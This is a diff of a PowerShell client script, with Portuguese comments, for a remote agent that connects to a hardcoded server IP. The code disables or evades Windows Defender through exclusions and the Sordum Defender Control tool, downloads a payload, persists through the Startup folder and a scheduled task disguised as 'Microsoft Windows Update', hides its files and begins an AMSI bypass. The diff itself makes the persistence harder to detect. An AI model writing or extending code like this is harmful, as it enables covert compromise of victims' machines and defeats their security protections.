@@ -1,5 +1,5 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# adaptive install: if Defender off → clean install; if on → exclusions + Sordum + install
+# persistência via schtasks.exe + XML (não usa New-ScheduledTask* — imune a 0x80041013)
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
@@ -26,9 +26,6 @@ $vbsPath = "$dir\$installName.vbs"
 if ($args -notcontains "-silent") {
     # ============================================================
     # 1. Deteta estado do Defender
-    #    RealTimeProtectionEnabled=false  → off (user disabled, or 3rd-party AV)
-    #    AntivirusEnabled=false           → off
-    #    Get-MpComputerStatus falha       → assume on (defensive default)
     # ============================================================
     $defenderOff = $false
     try {
@@ -45,14 +42,12 @@ if ($args -notcontains "-silent") {
         $sd = "$env:TEMP\sd_$h"
         New-Item -ItemType Directory -Path $sd -Force -ErrorAction SilentlyContinue | Out-Null
 
-        # exclusões ANTES de qualquer byte em disco
         New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
         try { Add-MpPreference -ExclusionPath $dir -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionPath $sd -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "powershell.exe" -Force -ErrorAction SilentlyContinue } catch {}
         try { Add-MpPreference -ExclusionProcess "wscript.exe" -Force -ErrorAction SilentlyContinue } catch {}
 
-        # Sordum Defender Control
         try {
             $7zr = "$sd\7zr.exe"
             if (-not (Test-Path $7zr)) {
@@ -79,7 +74,7 @@ if ($args -notcontains "-silent") {
     }
 
     # ============================================================
-    # 3. Instalação — igual para os dois casos
+    # 3. Instalação
     # ============================================================
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
@@ -99,20 +94,65 @@ if ($args -notcontains "-silent") {
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
+    # ============================================================
+    # 4. Persistência via schtasks.exe + XML — sem WMI do Agendador
+    # ============================================================
     try {
-        # Defender off: task a cada 3 min (só para sobreviver a reboot/logoff)
-        # Defender on:  task a cada 1 min (para relançar depois de cada kill)
         $interval = if ($defenderOff) { 3 } else { 1 }
-        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
-        $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
-        $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) `
-            -RepetitionInterval (New-TimeSpan -Minutes $interval) `
-            -RepetitionDuration ([TimeSpan]::FromDays(3650))
-        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew
-        Register-ScheduledTask -TaskName $taskName `
-            -Action $action -Trigger $triggerLogon,$triggerRepeat -Principal $principal `
-            -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+        $startTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss")
+
+        $xml = @"
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>Microsoft Windows Update</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <UserId>$env:USERNAME</UserId>
+    </LogonTrigger>
+    <TimeTrigger>
+      <StartBoundary>$startTime</StartBoundary>
+      <Repetition>
+        <Interval>PT${interval}M</Interval>
+        <Duration>P3650D</Duration>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>$env:USERNAME</UserId>
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Enabled>true</Enabled>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>wscript.exe</Command>
+      <Arguments>//B //Nologo "$vbsPath"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+"@
+
+        $xmlPath = "$dir\task_$h.xml"
+        Set-Content -Path $xmlPath -Value $xml -Encoding Unicode -Force
+        cmd /c "schtasks /create /tn `"$taskName`" /xml `"$xmlPath`" /f" 2>$null
+        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
+
+        # limpa task repetida órfã de versões anteriores (se existir)
+        cmd /c "schtasks /delete /tn `"$taskRepName`" /f" 2>$null
     } catch {}
 
     attrib +h +s +r $scriptPath 2>$null
@@ -123,7 +163,7 @@ if ($args -notcontains "-silent") {
 }
 
 # ============================================================
-# BLOCO -silent — inalterado
+# BLOCO -silent — o agente
 # ============================================================
 
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
